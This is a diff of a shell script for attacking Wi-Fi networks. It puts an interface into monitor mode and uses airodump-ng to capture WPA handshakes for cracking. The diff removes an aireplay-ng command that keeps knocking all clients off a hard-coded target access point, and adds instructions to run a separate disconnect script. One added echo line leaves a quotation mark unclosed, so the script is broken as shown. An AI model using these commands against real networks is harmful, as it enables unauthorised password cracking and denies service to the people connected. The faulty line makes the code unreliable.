@@ -20,11 +20,8 @@ sudo /usr/sbin/airmon-ng
 echo "[3]: sudo airodump-ng $monport -w handshakes -b abg"
   
 sudo airodump-ng $monport -w handshakes -b abg
-
-
-echo "Open a new terminal window to disconnect the clients connected 
-    to the target network.  "
-
-BSSID="B0:BB:E5:A4:DA:04"
-sudo aireplay-ng -0 0 -a $BSSID wlp1s0mon   
+ 
+echo  " in terminal 2 rename to scan1wifi run ./scan1wifi"
+echo "  in terminal 3 rename to discon   run ./disconn
+ 
  
